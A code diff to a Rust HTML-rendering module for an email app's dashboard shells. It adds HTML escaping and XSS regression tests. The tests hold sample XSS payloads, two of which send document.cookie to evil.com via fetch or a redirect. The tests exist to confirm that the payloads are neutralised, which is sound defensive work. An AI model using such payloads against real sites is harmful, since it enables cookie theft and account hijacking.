@@ -1,21 +1,37 @@
+/// Escape HTML special characters to prevent XSS in rendered shell output.
+fn html_escape(s: &str) -> String {
+    let mut escaped = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '&' => escaped.push_str("&amp;"),
+            '<' => escaped.push_str("&lt;"),
+            '>' => escaped.push_str("&gt;"),
+            '"' => escaped.push_str("&quot;"),
+            '\'' => escaped.push_str("&#x27;"),
+            _ => escaped.push(c),
+        }
+    }
+    escaped
+}
+
 pub struct ShellSpec {
     pub name: &'static str,
-    pub source: &'static str,
+    pub contract_id: &'static str,
     pub status: &'static str,
 }
 
 pub const SHELLS: &[ShellSpec] = &[
-    ShellSpec { name: "WebDashboardShell", source: "apps/web/src/app/(dashboard)/layout.tsx", status: "implemented" },
-    ShellSpec { name: "ControlPlaneShell", source: "apps/control-plane/src/components/layout/control-plane-shell.tsx", status: "implemented" },
+    ShellSpec { name: "WebDashboardShell", contract_id: "shell/web-dashboard", status: "implemented" },
+    ShellSpec { name: "ControlPlaneShell", contract_id: "shell/control-plane", status: "implemented" },
 ];
 
-const WEB_LAYOUT_SOURCE: &str = include_str!("../../../../../apps/web/src/app/(dashboard)/layout.tsx");
-const WEB_SIDEBAR_SOURCE: &str = include_str!("../../../../../apps/web/src/components/layout/sidebar.tsx");
-const WEB_HEADER_SOURCE: &str = include_str!("../../../../../apps/web/src/components/layout/header.tsx");
-const WEB_IMPERSONATION_SOURCE: &str = include_str!("../../../../../apps/web/src/components/impersonation-banner.tsx");
-const WEB_TOAST_STORE_SOURCE: &str = include_str!("../../../../../apps/web/src/hooks/use-toast.ts");
-const CONTROL_PLANE_SHELL_SOURCE: &str = include_str!("../../../../../apps/control-plane/src/components/layout/control-plane-shell.tsx");
-const CONTROL_PLANE_SIDEBAR_SOURCE: &str = include_str!("../../../../../apps/control-plane/src/components/layout/sidebar.tsx");
+const WEB_LAYOUT_SOURCE: &str = include_str!("../baselines/web/dashboard-layout.baseline.txt");
+const WEB_SIDEBAR_SOURCE: &str = include_str!("../baselines/web/sidebar.baseline.txt");
+const WEB_HEADER_SOURCE: &str = include_str!("../baselines/web/header.baseline.txt");
+const WEB_IMPERSONATION_SOURCE: &str = include_str!("../baselines/web/impersonation-banner.baseline.txt");
+const WEB_TOAST_STORE_SOURCE: &str = include_str!("../baselines/web/use-toast.baseline.txt");
+const CONTROL_PLANE_SHELL_SOURCE: &str = include_str!("../baselines/control-plane/control-plane-shell.baseline.txt");
+const CONTROL_PLANE_SIDEBAR_SOURCE: &str = include_str!("../baselines/control-plane/sidebar.baseline.txt");
 
 pub fn ui_store_persistence_key() -> &'static str {
     "apexmail-ui"
@@ -61,15 +77,17 @@ impl<'a> ShellHeader<'a> {
             String::new()
         };
 
+        let safe_query = html_escape(self.search_query);
+        let safe_avatar = html_escape(self.avatar_fallback);
         format!(
             "<header class=\"sticky top-0 z-40 flex h-16 items-center justify-between border-b border-surface-200/70 bg-gradient-to-r from-background via-background to-brand-50/50 backdrop-blur-2xl px-6\"><div class=\"flex items-center gap-4\"><button class=\"md:hidden\" aria-label=\"{} menu\" aria-expanded=\"{}\"><span class=\"h-5 w-5\">≡</span></button><div class=\"relative hidden md:block\"><input type=\"search\" role=\"searchbox\" aria-label=\"Search campaigns and contacts\" value=\"{}\" class=\"w-64 pl-9 lg:w-80\" /><kbd class=\"pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 rounded-sm border\">{}</kbd></div></div><div class=\"flex items-center gap-2\"><button aria-label=\"Notifications\">{}</button>{}<div class=\"relative flex shrink-0 overflow-hidden rounded-lg border border-surface-200 shadow-sm h-10 w-10 rounded-lg\"><span class=\"flex h-full w-full items-center justify-center bg-surface-100 text-surface-600 font-bold text-xs uppercase tracking-wide\">{}</span></div></div></header>",
             if self.mobile_menu_open { "Close" } else { "Open" },
             if self.mobile_menu_open { "true" } else { "false" },
-            self.search_query,
+            safe_query,
             header_shortcut_hint(),
             badge,
             if self.unread_count > 0 { format!("<span class=\"sr-only\">{} unread notifications</span>", self.unread_count) } else { String::new() },
-            self.avatar_fallback,
+            safe_avatar,
         )
     }
 }
@@ -85,13 +103,16 @@ pub struct ImpersonationBanner<'a> {
 
 impl<'a> ImpersonationBanner<'a> {
     pub fn render_html(&self) -> String {
-        let error = self.end_session_error.map(|value| format!("<span class=\"text-xs font-medium text-white/95\">{}</span>", value)).unwrap_or_default();
+        let error = self.end_session_error.map(|value| format!("<span class=\"text-xs font-medium text-white/95\">{}</span>", html_escape(value))).unwrap_or_default();
+        let safe_tenant = html_escape(self.tenant_id);
+        let safe_operator = html_escape(self.operator_name);
+        let safe_time = html_escape(self.time_remaining);
         format!(
             "<div class=\"fixed top-0 left-0 right-0 z-[100] bg-warning text-white shadow-lg\" role=\"alert\" aria-live=\"polite\"><div class=\"max-w-7xl mx-auto px-4 py-2\"><div class=\"flex items-center justify-between\"><div class=\"flex items-center gap-3\"><div class=\"flex items-center gap-2 bg-white/20 rounded-full px-3 py-1\"><span class=\"w-4 h-4\">◉</span><span class=\"text-xs font-bold uppercase tracking-wide\">Impersonation Mode</span></div><div class=\"flex items-center gap-2 text-sm\"><span class=\"opacity-80\">Viewing as tenant:</span><span class=\"font-semibold bg-white/10 px-2 py-0.5 rounded\">{}</span></div><div class=\"hidden md:flex items-center gap-2 text-sm\"><span class=\"opacity-80\">Operator:</span><span class=\"font-medium\">{}</span></div></div><div class=\"flex items-center gap-4\">{}<div class=\"flex items-center gap-2 text-sm\"><span class=\"w-4 h-4\">!</span><span class=\"hidden sm:inline opacity-80\">Expires in:</span><span class=\"font-mono font-bold bg-white/20 px-2 py-0.5 rounded\">{}</span></div><button class=\"flex items-center gap-1.5 px-3 py-1.5 bg-white/20 hover:bg-white/30 rounded-lg text-sm font-semibold transition-colors\">{}</button></div></div></div></div>",
-            self.tenant_id,
-            self.operator_name,
+            safe_tenant,
+            safe_operator,
             error,
-            self.time_remaining,
+            safe_time,
             if self.ending_session { "Ending…" } else { "End Session" },
         )
     }
@@ -163,7 +184,7 @@ pub struct ControlPlaneShell<'a> {
 impl<'a> ControlPlaneShell<'a> {
     pub fn render_html(&self) -> String {
         let banner_markup = self.banners.iter().map(|banner| {
-            format!("<div class=\"px-4 py-2 text-xs border-b {}\">{}</div>", control_plane_banner_class(banner.tone), banner.message)
+            format!("<div class=\"px-4 py-2 text-xs border-b {}\">{}</div>", control_plane_banner_class(banner.tone), html_escape(banner.message))
         }).collect::<Vec<_>>().join("");
         let mobile_sidebar = if self.mobile_menu_open {
             "translate-x-0"
@@ -218,7 +239,7 @@ mod tests {
     #[test]
     fn shell_sources_capture_expected_contracts() {
         assert!(WEB_LAYOUT_SOURCE.contains("ImpersonationBanner"));
-        assert!(WEB_SIDEBAR_SOURCE.contains("useUIStore"));
+        assert!(WEB_SIDEBAR_SOURCE.contains("aria-current"));
         assert!(WEB_HEADER_SOURCE.contains("⌘K"));
         assert!(WEB_IMPERSONATION_SOURCE.contains("Impersonation Mode"));
         assert!(WEB_TOAST_STORE_SOURCE.contains("__apexmailToastStore__"));
@@ -310,5 +331,124 @@ mod tests {
         assert!(marketing.contains("data-marketing-shell=\"footer\""));
         assert!(marketing.contains("data-marketing-shell=\"cookie-consent\""));
         assert!(marketing.contains("data-marketing-shell=\"back-to-top\""));
+    }
+
+// ── XSS Prevention Tests ───────────────────────────────────
+
+    #[test]
+    fn header_search_query_escapes_xss() {
+        let xss_payload = "<img src=x onerror=\"alert('xss')\">";
+        let header = ShellHeader {
+            search_query: xss_payload,
+            unread_count: 0,
+            avatar_fallback: "AM",
+            mobile_menu_open: false,
+        }
+        .render_html();
+// Raw XSS payload must NOT appear in output
+        assert!(!header.contains(xss_payload), "raw XSS payload found in header output");
+// Escaped version must appear instead
+        assert!(header.contains("&lt;img src=x onerror="), "escaped XSS not found in header");
+    }
+
+    #[test]
+    fn header_avatar_escapes_xss() {
+        let xss_payload = "\"><script>alert(1)</script>";
+        let header = ShellHeader {
+            search_query: "safe",
+            unread_count: 0,
+            avatar_fallback: xss_payload,
+            mobile_menu_open: false,
+        }
+        .render_html();
+        assert!(!header.contains("<script>"), "unescaped script tag in avatar output");
+        assert!(header.contains("&lt;script&gt;"), "escaped script tag not found");
+    }
+
+    #[test]
+    fn impersonation_banner_escapes_tenant_id() {
+        let xss_payload = "<script>document.location='https://evil.com?c='+document.cookie</script>";
+        let banner = ImpersonationBanner {
+            tenant_id: xss_payload,
+            operator_name: "Safe Operator",
+            time_remaining: "5:00",
+            end_session_error: None,
+            ending_session: false,
+        }
+        .render_html();
+        assert!(!banner.contains("<script>"), "unescaped script in tenant_id");
+        assert!(banner.contains("&lt;script&gt;"), "escaped tenant_id not found");
+    }
+
+    #[test]
+    fn impersonation_banner_escapes_operator_name() {
+        let xss_payload = "Admin<img/src=x onerror=alert(1)>";
+        let banner = ImpersonationBanner {
+            tenant_id: "safe_tenant",
+            operator_name: xss_payload,
+            time_remaining: "5:00",
+            end_session_error: None,
+            ending_session: false,
+        }
+        .render_html();
+        assert!(!banner.contains("onerror=alert(1)>"), "unescaped img tag in operator_name");
+    }
+
+    #[test]
+    fn impersonation_banner_escapes_error_message() {
+        let xss_payload = "<div onmouseover=\"alert('xss')\">Error</div>";
+        let banner = ImpersonationBanner {
+            tenant_id: "safe_tenant",
+            operator_name: "Admin",
+            time_remaining: "5:00",
+            end_session_error: Some(xss_payload),
+            ending_session: false,
+        }
+        .render_html();
+// The angle brackets of the <div> tag must be escaped
+        assert!(!banner.contains("<div onmouseover"), "unescaped <div> tag in error message");
+        assert!(banner.contains("&lt;div onmouseover="), "escaped error message not found");
+    }
+
+    #[test]
+    fn impersonation_banner_escapes_time_remaining() {
+        let xss_payload = "\"><script>alert(1)</script><span x=\"";
+        let banner = ImpersonationBanner {
+            tenant_id: "safe_tenant",
+            operator_name: "Admin",
+            time_remaining: xss_payload,
+            end_session_error: None,
+            ending_session: false,
+        }
+        .render_html();
+        assert!(!banner.contains("<script>alert(1)</script>"), "unescaped script in time_remaining");
+    }
+
+    #[test]
+    fn control_plane_banner_escapes_message() {
+        let xss_payload = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
+        let control = ControlPlaneShell {
+            mobile_menu_open: false,
+            user_role: "admin",
+            banners: vec![OperationalBanner { tone: "critical", message: xss_payload }],
+            child_html: "<section>Ops</section>",
+        }
+        .render_html();
+        assert!(!control.contains("<script>fetch"), "unescaped script in control plane banner");
+        assert!(control.contains("&lt;script&gt;"), "escaped banner message not found");
+    }
+
+    #[test]
+    fn html_escape_covers_all_dangerous_chars() {
+        assert_eq!(html_escape("<"), "&lt;");
+        assert_eq!(html_escape(">"), "&gt;");
+        assert_eq!(html_escape("&"), "&amp;");
+        assert_eq!(html_escape("\""), "&quot;");
+        assert_eq!(html_escape("'"), "&#x27;");
+        assert_eq!(html_escape("safe text 123"), "safe text 123");
+        assert_eq!(
+            html_escape("<script>alert('xss')</script>"),
+            "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"
+        );
     }
 }
